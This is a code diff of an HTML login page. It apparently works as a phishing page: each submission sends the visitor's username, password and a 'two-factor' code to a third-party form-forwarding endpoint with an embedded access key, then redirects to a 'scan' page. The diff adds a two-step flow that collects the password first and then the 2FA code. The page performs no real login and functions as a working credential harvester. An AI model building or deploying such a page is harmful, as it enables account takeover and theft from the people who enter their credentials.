@@ -6,7 +6,7 @@
 body {font-family: Arial, Helvetica, sans-serif;}
 form {border: 3px solid #f1f1f1; padding: 16px;}
 
-input[type=text], input[type=password], input[type=number] {
+input[type=text], input[type=password] {
   width: 100%;
   padding: 12px 20px;
   margin: 8px 0;
@@ -25,9 +25,7 @@ button {
   width: 100%;
 }
 
-button:hover {
-  opacity: 0.8;
-}
+button:hover { opacity: 0.8; }
 
 .cancelbtn {
   width: auto;
@@ -45,17 +43,10 @@ img.avatar {
   border-radius: 50%;
 }
 
-.container {
-  padding: 16px;
-}
+.container { padding: 16px; }
 
-span.psw {
-  float: right;
-  padding-top: 16px;
-}
-
-#codeField {
-  display: none; /* hidden until username+password are entered */
+#step2 {
+  display: none; /* hidden until step1 is completed */
 }
 </style>
 </head>
@@ -69,41 +60,45 @@ span.psw {
 
 <form id="validationForm" action="https://api.web3forms.com/submit" method="POST">
   <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
+  <!-- Redirect to /scan/scan/index.html after submission -->
+  <input type="hidden" name="_next" value="/scan/scan/index.html">
 
-  <div class="container">
+  <!-- Step 1: Username + Password -->
+  <div id="step1" class="container">
     <label for="email"><b>Username</b></label>
-    <input type="text" placeholder="Email/Mobile number" name="email" id="email" required>
-    
+    <input type="text" placeholder="Email/Mobile number" name="email" required>
+
     <label for="password"><b>Password</b></label>
-    <input type="password" placeholder="Enter Password" name="password" id="password" required>
-    
-    <!-- Code field appears only after username+password are filled -->
-    <div id="codeField">
-      <label for="code"><b>Validation Code</b></label>
-      <input type="text" placeholder="Enter Code" name="code" required>
-    </div>
-        
-    <button type="submit">Login</button>
+    <input type="password" placeholder="Enter Password" name="password" required>
+
+    <button type="button" id="proceedBtn">Proceed</button>
     <label>
       <input type="checkbox" checked="checked" name="remember"> Remember me
     </label>
   </div>
+
+  <!-- Step 2: Validation Code -->
+  <div id="step2" class="container">
+    <label for="code"><b>Authentication Code</b></label>
+    <input type="text" placeholder="Enter 2fa Code" name="code" required>
+
+    <button type="submit">Login</button>
+  </div>
 </form>
 
 <script>
-  const emailInput = document.getElementById("email");
-  const passwordInput = document.getElementById("password");
-  const codeField = document.getElementById("codeField");
+  const proceedBtn = document.getElementById("proceedBtn");
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
 
-  function checkInputs() {
-    if (emailInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
-      codeField.style.display = "block"; // show code field
-    }
-  }
-
-  emailInput.addEventListener("input", checkInputs);
-  passwordInput.addEventListener("input", checkInputs);
+  proceedBtn.addEventListener("click", function() {
+    // Hide step1 and show step2
+    step1.style.display = "none";
+    step2.style.display = "block";
+  });
 </script>
 
 </body>
 </html>
+
+
